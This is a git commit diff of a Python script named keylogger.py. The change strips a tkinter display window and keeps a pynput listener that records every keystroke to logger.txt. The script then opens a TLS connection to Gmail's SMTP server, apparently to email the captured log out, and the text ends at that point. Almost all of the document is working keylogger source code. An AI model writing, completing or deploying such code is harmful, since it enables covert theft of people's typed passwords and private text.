de0f745c5686ec01f7ce209a6765e2567ddf13dc
dh1180 <mjdh1936@gmail.com>
2021-02-05 23:12:19 +0900

    keylogger

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,4 @@
-from tkinter.constants import LEFT, N
 from pynput import keyboard
-import tkinter
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -9,45 +7,18 @@ from email import encoders
 
 
 with open("logger.txt", "w") as l:
-    window = tkinter.Tk()
-
-    count = 0
-
-    window.title("Dong's Keylogger")
-    window.geometry('640x400+100+100')
-
-    frame = tkinter.Frame(window)
-
-    scrollbar = tkinter.Scrollbar(frame)
-    scrollbar.pack(side="right", fill='y')
-
-    entry = tkinter.Entry(window, width=640)
-    entry.pack()
-    entry.place(x=0,y=380)
-
-    label = tkinter.Listbox(frame, yscrollcommand=scrollbar.set, width=400, height=20)
-    label.pack()
-
-    scrollbar["command"]=label.yview
 
     def on_press(key):
 
         global count
         if key == keyboard.Key.esc:
             return False
+
         print("{}".format(key))
-        label.insert(count, key)
-        label.see(count)
         l.write(str(key))
 
-        count += 1
-
-    frame.pack()
-
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
-    
-    window.mainloop()
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
 s = smtplib.SMTP('smtp.gmail.com', 587)
 s.starttls()
